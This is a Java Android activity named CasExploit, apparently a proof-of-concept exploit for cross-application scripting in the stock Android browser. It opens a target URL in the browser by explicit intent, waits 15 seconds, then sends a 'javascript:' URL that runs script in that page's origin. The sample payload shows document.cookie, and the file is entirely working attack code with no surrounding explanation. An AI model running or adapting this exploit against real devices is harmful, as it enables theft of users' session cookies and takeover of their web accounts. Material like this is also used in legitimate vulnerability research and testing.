public class CasExploit extends Activity
{
   static final String mPackage = "com.android.browser";
   static final String mClass = "BrowserActivity";
   static final String mUrl = "http://target.domain/";;
   static final String mJavascript = "alert(document.cookie)";
   static final int mSleep = 15000;

   @Override
   public void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.main);
      startBrowserActivity(mUrl);
         try {
             Thread.sleep(mSleep);
         }
         catch (InterruptedException e) {}
         startBrowserActivity("javascript:" + mJavascript);
   }

   private void startBrowserActivity(String url) {
      Intent res = new Intent("android.intent.action.VIEW");
      res.setComponent(new ComponentName(mPackage,mPackage+"."+mClass));
      res.setData(Uri.parse(url));
      startActivity(res);
   }
}

